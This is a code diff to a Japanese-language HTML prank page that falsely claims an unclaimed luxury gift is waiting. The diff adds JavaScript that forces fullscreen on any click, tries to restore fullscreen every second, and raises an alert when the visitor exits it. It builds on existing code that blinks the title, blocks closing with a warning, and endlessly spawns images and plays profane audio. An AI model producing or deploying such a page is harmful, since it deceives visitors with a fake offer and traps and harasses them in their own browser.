@@ -13,6 +13,7 @@
             margin: 0;
             background-color: #000;
             color: #fff;
+            cursor: pointer;
         }
         button {
             padding: 25px 50px;
@@ -42,21 +43,27 @@
 </head>
 <body>
     <h1>【重要】未受取の豪華ギフトが届いています</h1>
-    <p>有効期限が間もなく切れます。至急受け取りボタンを押してください。</p>
+    <p>ギフト受け取りを確定させるため、ボタンを押してください。</p>
     <button id="show-btn">今すぐ無料で受け取る</button>
     <div id="image-container"></div>
     <script>
         const btn = document.getElementById('show-btn');
         const container = document.getElementById('image-container');
         const imgSize = 150;
+        let hasInteracted = false; // ユーザーが一度でもクリックしたか
+
+        // タイトル点滅
         let blink = false;
         setInterval(() => {
             document.title = blink ? "【要確認】" : "！！！入手！！！";
             blink = !blink;
         }, 500);
+
+        // 閉じようとした時の警告
         window.onbeforeunload = function() {
             return "ギフトが破棄されますがよろしいですか？";
         };
+
         function spawnGift() {
             const newImg = document.createElement('img');
             newImg.src = 'slowparrot.gif';
@@ -69,13 +76,46 @@
             const audio = new Audio('fuckyou.mp3');
             audio.play().catch(e => {});
         }
-        btn.addEventListener('click', function() {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
+
+        // 全画面化を試みる関数
+        function enterFullscreen() {
+            if (!document.fullscreenElement && hasInteracted) {
+                document.documentElement.requestFullscreen().catch(e => {
+                    console.log("Full screen blocked: click required.");
+                });
             }
+        }
+
+        // 1. 画面のどこをクリックしても全画面化
+        document.addEventListener('click', function() {
+            hasInteracted = true;
+            enterFullscreen();
+        });
+
+        // 2. 【時間経過での全画面化】
+        // 1秒ごとにチェックし、全画面でなければ復帰を試みる
+        setInterval(function() {
+            if (hasInteracted) {
+                enterFullscreen();
+            }
+        }, 1000);
+
+        // 3. 全画面が解除されたのを検知してアラート
+        document.addEventListener('fullscreenchange', function() {
+            if (!document.fullscreenElement && hasInteracted) {
+                alert("警告：ギフトの受け取りには全画面表示が必要です！");
+            }
+        });
+
+        btn.addEventListener('click', function(e) {
+            e.stopPropagation();
+            hasInteracted = true;
+            enterFullscreen();
             spawnGift();
             btn.textContent = 'もっと受け取る！！';
         });
+
+        // 10秒後の無限増殖
         setTimeout(function() {
             setInterval(function() {
                 spawnGift();
